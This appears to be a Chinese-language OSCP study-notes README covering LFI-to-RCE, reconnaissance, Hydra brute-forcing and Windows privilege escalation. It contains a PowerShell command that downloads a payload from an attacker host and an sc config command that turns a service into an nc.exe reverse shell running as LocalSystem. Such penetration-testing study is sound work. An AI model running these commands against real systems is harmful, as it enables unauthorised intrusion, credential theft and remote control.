# Learn OSCP

### EXP

1. [01_lfi_phpinfo_exp.py](exps/01_lfi_phpinfo_exp.py)  利用 *LFI* 和 *PHPINFO* 到 *getshell*，[资料来源](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)



### **Hack Bar**

- *Remember turn off the automatic updates*

- *Post request not work as excepted*



### 识别操作系统位数

- *i686*  *i386* 代表 32 位操作系统
- *x86_64* 代表 64 位操作系统

### **在 64 位的 *kali* 上编译 32 位系统的exp**

- 安装特定依赖库

  ```bash
  $ apt-get install build-essential module-assistant gcc-multilib g++-multilib -y
  ```

- 编译

  ```bash
  $ gcc -m32 exp.c
  ```




### Reverse Shell & Spawning TTY & Upgrade it

[Reverse_Spawn_Upgrade_Shell](techniques/Reverse_Spawn_Upgrade_Shell)



*Nikto* 用于发现 *Web Server* 的默认配置、不安全的配置文件和程序。

```BASH
# nikto -h x.x.x.x  // Default 80
# nikto -h x.x.x.x -p 443,80  // multiple ports
# nikto -h https://url   // protocol, host
# nmap -p80 192.168.0.0/24 -oG - | nikto -h -   // scan multiple hosts
```

*Hydra* 爆破常见的服务

```bash
hydra -L user.txt  -P pass.txt 10.11.1.31 http-post-form "/login-off.asp:txtLoginID=^USER^&txtPassword=^PASS^&cmdSubmit=Login:F=ACCESS DENIED" -V


hydra -l usernmae  -P pass.txt 10.11.1.31 mssql -V # cracked 1433 ports windows
```



### LFI2RCE

原理：通过在服务器上写下代码，接着通过 *LFI* 利用该代码

- 通过包含 *Web Server* 或者 *ssh* 的日志
  - 用户有权限访问日志（大多数场景下是没有权限读取日志的）
  - 找到日志所在路径
    - *apache* */var/log/apache2/error.log*  */var/log/httpd-error.log*
    - *ssh /var/log/auth.log*
-  包含 *php://filter*  或 *php://input* 来实现
-  通过 *phpinfo.php* 和 *lfi* 来实现，[推荐资料](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)

***tip***： 

- `%00` 截断仅适用于 *php* 版本低于5.3
- `shell_exec` 本质是 *linux* 中的 *backtick operator* ，函数返回执行结果
- `exec` 返回执行结果的最后一行



场景如果是 *CMS* 的话，除了尝试寻找 *upload* 功能，切记观察其他功能，不要一条路走到底。

### 





1. [LFI2RCE](https://www.exploit-db.com/papers/12992)

### Privilege Escalation for Windows


- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
- [AccessChk v6.12](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) 用于确认 *windows* 用户权限
- [msfvenom-cheat-sheet](https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/)

- [Windows-pentest](https://github.com/ankh2054/windows-pentest) 包含有 *xp* 版本的 *accesschk*
- [Windows_Privesec](https://gist.github.com/sckalath/8dacd032b65404ef7411) 与  [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html) 的 *Roll up Your Sleeves* 比较像
- [OSCP-Windows-privilege-escalation](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html) 与 第一篇文章相比，条理更清晰，内容更精简， 建议结合起来使用。

### Tips

##### SMB 信息收集

Server Message Block 协议对应的操作系统信息如下

- **SMB1** – Windows 2000, XP and Windows 2003
- **SMB2** – Windows Vista SP1 and Windows 2008
- **SMB2.1** – Windows 7 and Windows 2008 R2
- **SMB3** – Windows 8 and Windows 2012.

识别 SMB NetBIOS 服务（通常监听于 139 和 445 端口）

1. `nmap -v -p 139,445 -oG smb.txt x.x.x.1-254` 
2. `nbtscan -r  x.x.x.0/24`

3. enum4linux 该工具集成了 *smbclient*、*rpcclinet*、*net* 和 *nmblookup*

漏洞识别

```bash
root@kali:~# ls -l /usr/share/nmap/scripts/smb*

root@kali:~# nmap -v -p 139,445 --script smb-xxx x.x.x.x # 同时加载多个 NSE 脚本
```

[SMB-enumeration经典参考资料](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)



##### nmap 信息收集

```BASH
$ nmap -v -sV -sT --top-ports 10 --open x.x.x.x  # 快速扫描 top 10 端口
```



##### 路径信息收集

```shell
# gobuster dir -u http://X.X.X.X/ -w /mnt/hgfs/share/OSCP/SecLists/Discovery/Web-Content/common.txt   -s '200,204,301,302,307,403,500' -e  -t 50

# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://10.11.1.22/FUZZ
```



###  查看当前用户身份的方式

```vbscript
# 无法执行 whoami 以及 echo %username% 的场景
# 解决方案一
echo 1>who.ami
dir /q

# 解决方案二
# 上传 kali 中的 /usr/share/windows-binaries/whoami.exe 到服务器上
```



### 文件上传的存放位置

`C:\RECYCLER ` 通常是可读写的目录，上传的 *exp* 建议放在这儿。

*Windows* 上传方式

- *Windows* 没有内置的 *curl* 或 *wget* ，所以使用 *powershell* 来替代下载功能

```powershell
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.1.0.49:8000/fuck.php','C:\fuck.php')
```

更多的上传方式请参考 [Windows-privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation/blob/master/README.md)。



### Bash 创建特殊的文件

```bash
touch ./-filename.txt
touch -- -filename.txt
rm ./-filename.txt
rm -- --filename.txt
```

### 查找权限存在问题的的 services

*[accesschk](https://web.archive.org/web/20111111130246/http://live.sysinternals.com/accesschk.exe)* (*Windows XP*) 可用于判断 *servcies* 的权限，总是先执行 `/acceptula`。因为第一次执行该程序会弹窗，所以带入参数来确认弹窗。

```shell
# 建议每次从命令行执行accesschk时，都带上/accepteula

accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv SSDPSRV /accepteula
accesschk.exe -ucqv upnphost /accepteula



sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.120 2233 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost

C:\"Documents and Settings"\Administrator\Desktop\proof.txt

```





##### 提权方式

1. 配置存在问题的 *services*
2. [*Exploiting environment variables*](http://techblog.rosedu.org/exploiting-environment-variables.html)
3. [restricted-linux-shell-escaping-techniques/](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/) 

##### 空闲时间

[社工钓鱼](https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-picture-0168183/)

[图片木马](http://gv7.me/articles/2017/picture-trojan-horse-making-method/)


# ChangeLog
- 20190714 tips
- 20190713 add 
- 20190711 update
- 20190710 init
